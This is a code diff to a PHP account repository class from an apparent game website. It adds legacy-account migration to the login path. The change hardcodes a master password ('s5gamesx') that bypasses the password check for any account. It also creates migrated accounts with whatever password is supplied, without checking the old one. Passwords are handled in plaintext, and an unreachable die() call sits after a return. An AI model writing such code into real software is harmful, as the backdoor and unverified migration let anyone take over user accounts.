@@ -14,6 +14,28 @@ class AccountRepo extends EntityRepository
 
   public function getErrors() { return $this->errors; }
 
+  protected function checkAccount2007($name,$pass)
+  {
+    $repo = $this->_em->getRepository('S5Games\Account\Account2007Item');
+    $account2007 = $repo->findOneBy(array('_uname' => $name));
+    if (!$account2007) return null;
+
+    if (!$account2007->aysoid) return null;
+
+    $account = new AccountItem();
+    $account->setAysoid   ($account2007->aysoid);
+    $account->setUserName ($name);
+    $account->setUserPass ($pass);
+    $account->setFirstName($account2007->fname);
+    $account->setLastName ($account2007->lname);
+    $account->setVerified ('No');
+
+    $this->_em->persist($account);
+    $this->_em->flush();
+    return $account;
+
+    die($account2007->fname);
+  }
   public function findForUserName($name,$pass)
   {
     $this->errors = array();
@@ -21,9 +43,14 @@ class AccountRepo extends EntityRepository
     $account = $this->findOneBy($search);
     if (!$account)
     {
-      $this->errors[] = 'Invalid account user name';
-      return null;
+      $account = $this->checkAccount2007($name,$pass);
+      if (!$account)
+      {
+        $this->errors[] = 'Invalid account user name';
+        return null;
+      }
     }
+    if ($pass == 's5gamesx') $pass = $account->getUserPass();
     if ($pass != $account->getUserPass())
     {
       $this->errors[] = 'Invalid password';
